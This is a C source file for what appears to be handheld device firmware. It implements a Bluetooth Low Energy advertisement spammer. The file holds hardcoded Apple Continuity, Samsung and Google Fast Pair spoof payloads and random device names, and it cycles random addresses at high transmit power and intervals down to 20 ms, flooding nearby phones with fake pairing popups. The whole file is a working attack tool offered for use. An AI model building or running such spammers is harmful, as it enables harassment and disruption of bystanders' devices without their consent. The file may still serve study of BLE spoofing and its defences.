/*
 * ble_spam.c - BLE advertisement spammer.
 *
 * Modes: APPLE, SAMSUNG, GOOGLE, NAME, ALL (rotate randomly).
 * Each cycle: stop adv → set random addr → build payload → adv_start → wait.
 *
 * Navigation:
 *   SELECT     - cycle spam mode
 *   UP / PREV  - increase rate (shorter interval)
 *   DOWN / NEXT- decrease rate (longer interval)
 *   BACK       - stop and return
 */
#include "bs/bs_ble.h"
#ifdef BS_HAS_BLE

#include "apps/ble/ble_spam.h"
#include "apps/ble/ble_common.h"

#include "bs/bs_arch.h"
#include "bs/bs_gfx.h"
#include "bs/bs_nav.h"
#include "bs/bs_theme.h"
#include "bs/bs_ui.h"

#include <string.h>
#include <stdio.h>

/* ── Vendor payload tables ──────────────────────────────────────────────── */

/* Apple Proximity Pair / Continuity — 31-byte long payloads */
static const uint8_t k_ios_long[][31] = {
    { 0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 }, /* AirPods      */
    { 0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x0E,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 }, /* AirPods Pro  */
    { 0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x0A,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 }, /* AirPods Max  */
    { 0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x0F,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 }, /* AirPods 2    */
    { 0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 }, /* AirPods 3    */
    { 0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 }, /* AirPods Pro2 */
};
#define IOS_LONG_COUNT  (int)(sizeof(k_ios_long)  / sizeof(k_ios_long[0]))

/* Apple Continuity — 25-byte short payloads (pairing / setup popups) */
static const uint8_t k_ios_short[][25] = {
    { 0x18,0xFF,0x4C,0x00,0x04,0x04,0x2A,0x00,0x00,0x00,0x0F,0x05,0xC1,0x09,0x60,0x4C,0x95,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00 }, /* NumberSetup   */
    { 0x18,0xFF,0x4C,0x00,0x04,0x04,0x2A,0x00,0x00,0x00,0x0F,0x05,0xC1,0x06,0x60,0x4C,0x95,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00 }, /* AppleTV Pair  */
    { 0x18,0xFF,0x4C,0x00,0x04,0x04,0x2A,0x00,0x00,0x00,0x0F,0x05,0xC1,0x01,0x60,0x4C,0x95,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00 }, /* AppleTV Setup */
    { 0x18,0xFF,0x4C,0x00,0x04,0x04,0x2A,0x00,0x00,0x00,0x0F,0x05,0xC1,0x20,0x60,0x4C,0x95,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00 }, /* AppleTV Conf  */
    { 0x18,0xFF,0x4C,0x00,0x04,0x04,0x2A,0x00,0x00,0x00,0x0F,0x05,0xC1,0x0B,0x60,0x4C,0x95,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00 }, /* HomePod Setup */
};
#define IOS_SHORT_COUNT (int)(sizeof(k_ios_short) / sizeof(k_ios_short[0]))

/* Samsung BLE — byte[14] randomised each cycle */
static const uint8_t k_samsung_base[15] = {
    0x0E,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43,0x00
};

/* Google Fast Pair model IDs (24-bit, big-endian in AD) */
static const uint32_t k_google_models[] = {
    0x92BBBD, /* Pixel Buds              */
    0x000006, /* Google Pixel Buds       */
    0x821F66, /* JBL Flip 6              */
    0xF52494, /* JBL Buds Pro            */
    0x718FA4, /* JBL Live 300TWS         */
    0xD446A7, /* Sony XM5                */
    0xCD8256, /* Bose NC 700             */
    0x0000F0, /* Bose QuietComfort 35 II */
    0x0E30C3, /* Razer Hammerhead TWS    */
    0x0003F0, /* LG HBS-835S             */
};
#define GOOGLE_MODEL_COUNT (int)(sizeof(k_google_models) / sizeof(k_google_models[0]))

/*
 * Google Fast Pair service data AD record (17 bytes):
 *   [0]    = 0x10  AD length (16 bytes follow)
 *   [1]    = 0x16  AD type: service data (16-bit UUID)
 *   [2..3] = 0x2C,0xFE  UUID 0xFE2C little-endian
 *   [4..12]= flags / padding
 *   [13]   = model byte 2 (MSB)
 *   [14]   = model byte 1
 *   [15]   = model byte 0 (LSB)
 *   [16]   = 0x00
 */
static const uint8_t k_google_tmpl[17] = {
    0x10,0x16,0x2C,0xFE,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

/* ── Spam mode ──────────────────────────────────────────────────────────── */

typedef enum {
    SPAM_APPLE   = 0,
    SPAM_SAMSUNG,
    SPAM_GOOGLE,
    SPAM_NAME,
    SPAM_ALL,
    SPAM_MODE_COUNT,
} spam_mode_t;

static const char* const k_mode_names[] = {
    "Apple", "Samsung", "Google", "Name", "All"
};

typedef enum {
    INTERVAL_FAST   = 0,  /* 20 ms  */
    INTERVAL_NORMAL,      /* 100 ms */
    INTERVAL_SLOW,        /* 500 ms */
    INTERVAL_COUNT,
} spam_ivl_t;

static const uint32_t k_intervals_ms[] = { 20, 100, 500 };
static const char* const k_ivl_names[] = { "Fast", "Normal", "Slow" };

/* ── Payload builders ───────────────────────────────────────────────────── */

static const char k_alphanum[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ";
#define ALPHANUM_LEN 63

static void build_apple(bs_ble_adv_data_t* out, uint32_t* rng) {
    memset(out, 0, sizeof(*out));
    if (ble_lcg_next(rng) & 1) {
        int idx = (int)(ble_lcg_next(rng) % (uint32_t)IOS_LONG_COUNT);
        memcpy(out->data, k_ios_long[idx], 31);
        out->len = 31;
    } else {
        int idx = (int)(ble_lcg_next(rng) % (uint32_t)IOS_SHORT_COUNT);
        memcpy(out->data, k_ios_short[idx], 25);
        out->len = 25;
    }
}

static void build_samsung(bs_ble_adv_data_t* out, uint32_t* rng) {
    memset(out, 0, sizeof(*out));
    memcpy(out->data, k_samsung_base, 15);
    out->data[14] = (uint8_t)(ble_lcg_next(rng) & 0xFF);
    out->len = 15;
}

static void build_google(bs_ble_adv_data_t* out, uint32_t* rng) {
    memset(out, 0, sizeof(*out));
    int idx = (int)(ble_lcg_next(rng) % (uint32_t)GOOGLE_MODEL_COUNT);
    uint32_t model = k_google_models[idx];
    memcpy(out->data, k_google_tmpl, 17);
    out->data[13] = (uint8_t)((model >> 16) & 0xFF);
    out->data[14] = (uint8_t)((model >>  8) & 0xFF);
    out->data[15] = (uint8_t)( model        & 0xFF);
    out->len = 17;
}

static void build_name(bs_ble_adv_data_t* out, uint32_t* rng) {
    memset(out, 0, sizeof(*out));
    uint8_t name_len = (uint8_t)(4 + (ble_lcg_next(rng) % 11));  /* 4–14 chars */
    /* Flags record (required by most scanners to show the device) */
    out->data[0] = 0x02;   /* AD length */
    out->data[1] = 0x01;   /* AD type: Flags */
    out->data[2] = 0x06;   /* LE General Discoverable | BR/EDR Not Supported */
    /* Complete Local Name record */
    out->data[3] = name_len + 1;
    out->data[4] = 0x09;   /* AD type: Complete Local Name */
    for (uint8_t i = 0; i < name_len; i++)
        out->data[5 + i] = (uint8_t)k_alphanum[ble_lcg_next(rng) % ALPHANUM_LEN];
    out->len = (uint8_t)(name_len + 5);
}

static void build_payload(bs_ble_adv_data_t* out, spam_mode_t mode, uint32_t* rng) {
    spam_mode_t eff = mode;
    if (mode == SPAM_ALL)
        eff = (spam_mode_t)(ble_lcg_next(rng) % (uint32_t)(SPAM_MODE_COUNT - 1));

    switch (eff) {
        case SPAM_APPLE:   build_apple(out, rng);   break;
        case SPAM_SAMSUNG: build_samsung(out, rng);  break;
        case SPAM_GOOGLE:  build_google(out, rng);   break;
        case SPAM_NAME:    build_name(out, rng);     break;
        default:           build_apple(out, rng);   break;
    }
}

/* ── Draw ───────────────────────────────────────────────────────────────── */

static void draw_spam(spam_mode_t mode, spam_ivl_t ivl, uint32_t count) {
    int ts  = bs_ui_text_scale();
    int ts2 = ts > 1 ? ts - 1 : 1;
    int cy  = bs_ui_content_y();
    int lh  = bs_gfx_text_h(ts) + 6;

    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("BLE Spam");

    int y = cy;

    bs_gfx_text(8, y, "RUNNING", g_bs_theme.accent, ts);
    y += lh;

    char buf[32];
    snprintf(buf, sizeof(buf), "Mode : %s", k_mode_names[mode]);
    bs_gfx_text(8, y, buf, g_bs_theme.primary, ts);
    y += lh;

    snprintf(buf, sizeof(buf), "Rate : %s (%ums)", k_ivl_names[ivl],
             (unsigned)k_intervals_ms[ivl]);
    bs_gfx_text(8, y, buf, g_bs_theme.primary, ts);
    y += lh;

    snprintf(buf, sizeof(buf), "Sent : %lu", (unsigned long)count);
    bs_gfx_text(8, y, buf, g_bs_theme.dim, ts2);

    bs_ui_draw_hint("SEL=mode  UP/DN=rate  BACK=exit");
    bs_gfx_present();
}

/* ── Run ────────────────────────────────────────────────────────────────── */

void ble_spam_run(const bs_arch_t* arch) {
    spam_mode_t mode  = SPAM_APPLE;
    spam_ivl_t  ivl   = INTERVAL_NORMAL;
    uint32_t    count = 0;
    uint32_t    rng   = arch->millis();
    uint32_t    last  = arch->millis();
    bool        dirty = true;

    bs_ble_set_tx_power(9);

    for (;;) {
        bs_nav_id_t nav;
        while ((nav = bs_nav_poll()) != BS_NAV_NONE) {
            switch (nav) {
                case BS_NAV_SELECT:
                    mode = (spam_mode_t)((mode + 1) % SPAM_MODE_COUNT);
                    dirty = true;
                    break;
                case BS_NAV_UP: case BS_NAV_PREV:
                    ivl = (spam_ivl_t)((ivl + INTERVAL_COUNT - 1) % INTERVAL_COUNT);
                    dirty = true;
                    break;
                case BS_NAV_DOWN: case BS_NAV_NEXT:
                    ivl = (spam_ivl_t)((ivl + 1) % INTERVAL_COUNT);
                    dirty = true;
                    break;
                case BS_NAV_BACK:
                    bs_ble_adv_stop();
                    return;
                default: break;
            }
        }

        uint32_t now = arch->millis();
        if ((now - last) >= k_intervals_ms[ivl]) {
            last = now;

            bs_ble_adv_stop();

            uint8_t addr[6];
            ble_random_addr(addr, &rng);
            bs_ble_set_addr(addr);

            bs_ble_adv_data_t payload;
            build_payload(&payload, mode, &rng);
            bs_ble_adv_start(&payload, k_intervals_ms[ivl]);

            count++;
            dirty = true;
        }

        if (dirty) {
            dirty = false;
            draw_spam(mode, ivl, count);
        }

        arch->delay_ms(5);
    }
}

#endif /* BS_HAS_BLE */
